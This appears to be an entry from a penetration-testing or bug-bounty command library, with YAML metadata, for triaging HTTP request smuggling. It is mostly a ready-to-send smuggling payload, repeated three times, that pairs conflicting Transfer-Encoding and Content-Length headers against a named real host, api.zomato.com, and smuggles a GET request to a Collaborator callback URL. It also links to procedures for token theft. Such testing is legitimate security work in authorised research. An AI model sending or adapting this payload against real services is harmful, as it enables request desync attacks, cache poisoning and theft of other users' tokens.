---
data: |-
  DELETE / HTTP/1.1
  Transfer-Encoding: chunked
  Host: api.zomato.com
  Content-Length: 91
  User-Agent: Treasure/6.7
  0
  GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
  X: X
tags:
  - http-request-smuggling
  - triage
type: command
executor: bash
platforms:
  - Web
id: 1f0529ed-66e2-4cc0-aa17-ca6af3d58149
created_at: '2025-12-11T06:10:24.245Z'
updated_at: '2025-12-11T06:10:24.245Z'
verified: false
validated: true
submitted: true
---
# smuggle-request-triage

## Command

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0
GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```

## Description

Template for triage, smuggling request to redirect to Collaborator URL, used in triage steps to reproduce the issue.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `**YOUR_COLLAB_URL**` | Placeholder for Burp Collaborator URL | Yes |

## Examples

### Basic Usage

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0
GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```

## Expected Output

HTTP requests or DNS lookups in Collaborator window.

## Related

- [[procedures/Exploit-Smuggling-with-Open-Redirect-for-Token-Theft]]
- [[commands/smuggle-request-token-theft]]
